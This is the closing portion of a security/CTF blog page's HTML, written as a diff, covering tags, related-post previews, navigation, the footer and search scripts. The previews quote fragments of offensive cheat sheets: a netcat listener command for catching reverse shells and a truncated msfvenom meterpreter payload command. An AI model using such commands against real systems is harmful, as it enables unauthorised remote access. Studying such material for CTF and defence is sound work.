+        <a class="post-tag btn btn-outline-primary" href="/tags/writeups/">writeups</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/challange/">challange</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/attackdefense-com/">AttackDefense.com</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/exploit/">exploit</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/solution/">solution</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/tutorial/">tutorial</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/exercise/">exercise</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/level/">level</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/nebula/">nebula</a>
+      
+    </div>
+  </section>
+
+
+            </div>
+
+            
+              
+              
+
+
+
+
+            
+          </aside>
+        </div>
+
+        <div class="row">
+          <!-- tail -->
+          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
+            
+              
+              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->
+
+<!-- The total size of related posts -->
+
+
+<!-- An random integer that bigger than 0 -->
+
+
+<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  <aside id="related-posts" aria-labelledby="related-label">
+    <h3 class="mb-4" id="related-label">Further Reading</h3>
+    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
+      
+        <article class="col">
+          <a href="/2018/07/15/reverse-shells-cheat-sheet/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1531602000"
+  data-df="ll"
+  
+>
+  Jul 15, 2018
+</time>
+
+              <h4 class="pt-0 my-2">Reverse Shells Cheat Sheet</h4>
+              <div class="text-muted">
+                <p>
+                  
+
+
+
+
+
+                  This list represent an comprehensive cheat sheet of shells and other related stuff.
+
+Listening
+To setup a listening netcat instance, enter the following:
+
+sudo nc -nvlp 80
+
+
+Reverse Shells
+
+To conn...
+                </p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
+        <article class="col">
+          <a href="/2018/07/25/msfvenom-cheat-sheet/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1532469480"
+  data-df="ll"
+  
+>
+  Jul 25, 2018
+</time>
+
+              <h4 class="pt-0 my-2">Msfvenom Cheat Sheet</h4>
+              <div class="text-muted">
+                <p>
+                  
+
+
+
+
+
+                  
+
+MsfVenom is a Metasploit standalone payload generator as a replacement for msfpayload and msfencode.
+
+Binaries
+
+
+  
+    
+      Command
+      Info
+    
+  
+  
+    
+      msfvenom -p windows/meterpr...
+                </p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
+        <article class="col">
+          <a href="/2018/12/02/metasploit-cheat-sheet/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1543707060"
+  data-df="ll"
+  
+>
+  Dec  2, 2018
+</time>
+
+              <h4 class="pt-0 my-2">Metasploit Cheat Sheet</h4>
+              <div class="text-muted">
+                <p>
+                  
+
+
+
+
+
+                  
+
+A few months ago I have created a msfvenom cheat sheet without explaining the Metasploit framework, so here it is a brief cheat sheet.
+
+Metasploit is a free tool that has built-in exploits which ...
+                </p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
+    </nav>
+  </aside>
+  <!-- #related-posts -->
+
+
+            
+              
+              <!-- Navigation buttons at the bottom of the post. -->
+
+<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
+  
+  
+
+  
+    <a
+      href="/2018/09/30/dctf-2018-message/"
+      class="btn btn-outline-primary"
+      aria-label="Older"
+    >
+      <p>[DCTF Quals 2018] Message</p>
+    </a>
+  
+
+  
+    <a
+      href="/2018/10/06/dctf-quals-2018-lucky/"
+      class="btn btn-outline-primary"
+      aria-label="Newer"
+    >
+      <p>[DCTF Quals 2018] Lucky</p>
+    </a>
+  
+</nav>
+
+            
+              
+              <!--  The comments switcher -->
+
+
+            
+
+            <!-- The Footer -->
+
+<footer
+  aria-label="Site Info"
+  class="
+    d-flex flex-column justify-content-center text-muted
+    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
+  "
+>
+  <p>©
+    <time>2024</time>
+
+    
+      <a href="https://twitter.com/LucianNitescu">Lucian Nitescu</a>.
+    
+
+    
+      <span
+        data-bs-toggle="tooltip"
+        data-bs-placement="top"
+        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
+      >Some rights reserved.</span>
+    
+  </p>
+
+  <p>Using the <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
+  </p>
+</footer>
+
+          </div>
+        </div>
+
+        <!-- The Search results -->
+
+<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
+  <div class="col-11 content">
+    <div id="search-hints">
+      <!-- The trending tags list -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+
+
+  <section>
+    <h2 class="panel-heading">Trending Tags</h2>
+    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/writeups/">writeups</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/challange/">challange</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/attackdefense-com/">AttackDefense.com</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/exploit/">exploit</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/solution/">solution</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/tutorial/">tutorial</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/exercise/">exercise</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/level/">level</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/nebula/">nebula</a>
+      
+    </div>
+  </section>
+
+
+    </div>
+    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
+  </div>
+</div>
+
+      </div>
+
+      <aside aria-label="Scroll to Top">
+        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
+          <i class="fas fa-angle-up"></i>
+        </button>
+      </aside>
+    </div>
+
+    <div id="mask"></div>
+
+    
+      <aside
+  id="notification"
+  class="toast"
+  role="alert"
+  aria-live="assertive"
+  aria-atomic="true"
+  data-bs-animation="true"
+  data-bs-autohide="false"
+>
+  <div class="toast-header">
+    <button
+      type="button"
+      class="btn-close ms-auto"
+      data-bs-dismiss="toast"
+      aria-label="Close"
+    ></button>
+  </div>
+  <div class="toast-body text-center pt-0">
+    <p class="px-2 mb-3">A new version of content is available.</p>
+    <button type="button" class="btn btn-primary" aria-label="Update">
+      Update
+    </button>
+  </div>
+</aside>
+
+    
+
+    <!-- JavaScripts -->
+
+    <!-- JS selector for site. -->
+
+<!-- commons -->
+
+
+
+<!-- layout specified -->
+
+
+
+
+  
+
+  
+    <!-- image lazy-loading & popup & clipboard -->
+    
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+
+
+  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.25.0/dist/tocbot.min.js"></script>
+
+
+
+
+
+
+<script defer src="/assets/js/dist/post.min.js"></script>
+
+
+
+
+
+
+    
+
+    <!--
+  Jekyll Simple Search loader
+  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
+-->
+
+
+
+
+
+<script>
+  /* Note: dependent library will be loaded in `js-selector.html` */
+  SimpleJekyllSearch({
+    searchInput: document.getElementById('search-input'),
+    resultsContainer: document.getElementById('search-results'),
+    json: '/assets/js/data/search.json',
+    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
+    noResultsText: '<p class="mt-5"></p>',
+    templateMiddleware: function(prop, value, template) {
+      if (prop === 'categories') {
+        if (value === '') {
+          return `${value}`;
+        } else {
+          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
+        }
+      }
+
+      if (prop === 'tags') {
+        if (value === '') {
+          return `${value}`;
+        } else {
+          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
+        }
+      }
+    }
+  });
+</script>
+
+  </body>
+</html>
+
